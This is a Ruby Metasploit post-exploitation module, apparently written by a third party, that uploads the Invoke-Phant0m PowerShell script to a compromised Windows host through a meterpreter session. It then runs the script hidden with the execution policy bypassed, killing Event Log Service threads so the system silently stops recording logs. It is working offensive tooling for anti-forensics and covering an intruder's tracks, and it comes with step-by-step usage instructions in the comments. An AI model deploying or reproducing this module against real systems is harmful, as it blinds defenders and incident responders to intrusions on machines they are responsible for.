##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



##
# [ Invoke_PhantOm.rb - disable logfiles creation ]
# Author: pedr0 Ubuntu aka: [r00t-3xp10it]
# tested on: windows 10
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This post-exploitation module requires a meterpreter session,
# to be able to upload and execute Invoke-Phant0m.ps1 powershell script
# Invoke-Phant0m.ps1 script walks thread stacks of Event Log Service process (spesific svchost.exe)
# and identify Event Log Threads to kill Event Log Service Threads. So the system will not be able
# to collect logs and at the same time the Event Log Service will appear to be running.
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on      => set SESSION 1
# The full path of Invoke-Phant0m.ps1 to upload => set UPLOAD_PATH /tmp/Invoke-Phant0m.ps1
# The full remote path were to upload           => set REMOTE_PATH %temp%\\Invoke-Phant0m.ps1
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/manage/Invoke_PhantOm.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/manage/Invoke_PhantOm.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/manage
#
#
# [ EXPLOITATION ]
# 1 - Exploit target to get session back (meterpreter)
# 2 - Download Invoke-Phant0m.ps1 script
#     https://github.com/r00t-3xp10it/Invoke-Phant0m
# 3 - run post-module Invoke-PhantOm.rb
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/manage/Invoke_PhantOm
# msf post(Invoke_PhantOm) > info
# msf post(Invoke_PhantOm) > show options
# msf post(Invoke_PhantOm) > set [option(s)]
# msf post(Invoke_PhantOm) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##





#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Invoke_Phantom [disable logfiles creation]',
                        'Description'   => %q{
                                        This script walks thread stacks of Event Log Service process (spesific svchost.exe) and identify Event Log Threads to kill Event Log Service Threads. So the system will not be able to collect logs and at the same time the Event Log Service will appear to be running..
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Special thanks: hlldz', # testing/debug module
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'jun 27 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 (32 bits)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '3', # default its to run againts windows 7 (32 bits)
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/Invoke-Phant0m' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',  # Default its to run againts session 1
                                        'UPLOAD_PATH' => '/tmp/Invoke-Phant0m.ps1', # Default full path of agent to upload
                                        'REMOTE_PATH' => '%temp%\\Invoke-Phant0m.ps1', # Default full path of agent to upload 
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('UPLOAD_PATH', [ false, 'The full path of Invoke-Phant0m.ps1 to upload' , false]),
                                OptBool.new('REMOTE_PATH', [ false, 'The full remote path were to upload' , false])
                        ], self.class)
 
        end




#
# REPORT ACTIVE INTERFACE (WLAN/LAN)
#
def ls_stage1
# check target arch (to inject into powershell string)
arch_check = client.fs.file.expand_path("%Windir%\\SysWOW64")
if arch_check == "C:\\Windows\\SysWOW64"
  arch = "SysWOW64"
else
  arch = "System32"
end


  r=''
  d_path = datastore['UPLOAD_PATH']
  u_path = datastore['REMOTE_PATH']
  key = "powershell.exe -nop -wind hidden -ExecutionPolicy Bypass -File \"%temp%\\Invoke-Phant0m.ps1\""
  # key = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File \"%temp%\\Invoke-Phant0m.ps1\""
  #
  # check for proper config settings enter ..
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['UPLOAD_PATH'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set UPLOAD_PATH option...")
    return nil
  else
    print_status("Stoping eventlog from recording ..")
  end

    #
    # upload our executable into target system ..
    #
    print_good("Uploading Invoke-Phant0m.ps1 agent ..")
    client.fs.file.upload("#{d_path}","#{u_path}")
    print_good("Uploaded to: #{u_path}")
    sleep(1.0)
      #
      # Executing powershell module ..
      #
      print_good("Executing: Invoke-Phant0m.ps1")
      r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
      print_good("  exec => #{key}")

    #
    # display command executed ..
    #
    print_line("")
    print_line(r)
    print_line("")
    #
    # close channel when done
    #
    r.channel.close
    r.close

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
  print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
end





#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client


      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +--------------------------------------------+")
    print_line("    | * INVOKE-PHANTOM (disable logs creation) * |")
    print_line("    |    Author: Pedro Ubuntu [ r00t-3xp10it ]   |")
    print_line("    +--------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Target Architecture : #{sysnfo['Architecture']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # check for proper operating system (windows-not-wine)
    #
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    #
    # check for proper session (meterpreter)
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("ABORT]:This post-module only works in meterpreter sessions")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


#
# Selected settings to run
#
      if datastore['UPLOAD_PATH']
         ls_stage1
      end
   end
end
